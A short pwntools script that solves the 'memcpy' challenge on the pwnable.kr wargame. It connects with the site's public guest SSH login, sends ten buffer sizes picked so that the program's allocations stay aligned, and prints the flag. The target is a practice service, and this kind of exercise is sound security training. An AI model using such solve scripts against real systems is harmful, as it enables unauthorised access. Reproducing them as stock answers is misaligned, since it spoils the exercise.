from pwn import *
s = ssh(host="pwnable.kr", user="memcpy", port=2222, password="guest")

# got the numbers by playing with the numbers in the ranges to make sure
# that the malloc is aligned
p = s.remote('0', 9022)
p.sendline(b"8")
p.sendline(b"16")
p.sendline(b"32")
p.sendline(b"69")
p.sendline(b"133")
p.sendline(b"261")
p.sendline(b"517")
p.sendline(b"1029")
p.sendline(b"2053")
p.sendline(b"4096")
sleep(6)

p.recvuntil(b"flag : ").decode()
log.success(f"flag: {p.recv().decode()}")
